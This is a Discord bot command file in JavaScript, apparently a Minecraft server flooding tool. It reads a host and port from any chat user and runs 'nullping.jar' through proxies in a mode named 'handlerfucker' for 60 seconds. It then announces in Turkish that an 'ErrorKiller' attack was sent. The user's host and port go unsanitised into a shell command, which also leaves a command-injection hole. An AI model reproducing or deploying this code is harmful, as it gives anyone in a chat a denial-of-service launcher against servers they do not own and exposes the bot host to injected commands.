const Discord = require("discord.js");
const moment = require('moment');

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
var exec = require('child_process').exec

 {
	exec(`cmd /c java -jar nullping.jar host-${host} port-${port} file-socks4.txt mode-handlerfucker time-60`, (error, stdout, stderr) => {
		if(error != null) {
			console.log(error)
		}
	});
		message.channel.send(`**ErrorKiller** saldırısı gönderildi, **${host}** port, **${port}** zaman **60** saniye :rocket:`)
	}
}



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['err'],
  permLevel: 0
}

exports.help = {
  name: 'errorkiller2',
}